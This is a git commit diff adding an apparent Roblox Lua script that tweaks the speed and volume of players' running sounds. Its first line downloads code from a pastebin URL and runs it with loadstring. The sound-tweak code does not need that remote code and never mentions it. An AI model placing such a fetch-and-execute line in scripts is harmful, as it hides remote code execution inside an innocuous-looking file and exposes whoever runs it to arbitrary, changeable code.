31446855b8b28fe5de16e68aa5b96e961ed3a629
Sash8585705 <121766298+Sash8585705@users.noreply.github.com>
2025-05-16 21:19:27 +0700

    Update 2015m.lua

--- 2015m.lua
+++ 2015m.lua
@@ -1,1 +1,22 @@
+loadstring(game:HttpGet("https://pastebin.com/raw/8c5f7KDJ",true))()
 
+local Players = game:GetService("Players")
+
+local function modifyRunningSound(character)
+    local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
+    local runningSound = humanoidRootPart:FindFirstChild("Running") or humanoidRootPart:WaitForChild("Running")
+    
+    runningSound.PlaybackSpeed = 1.498
+    runningSound.Volume = 2
+end
+
+for _, player in ipairs(Players:GetPlayers()) do
+    if player.Character then
+        modifyRunningSound(player.Character)
+    end
+        player.CharacterAdded:Connect(modifyRunningSound)
+end
+
+Players.PlayerAdded:Connect(function(player)
+    player.CharacterAdded:Connect(modifyRunningSound)
+end)
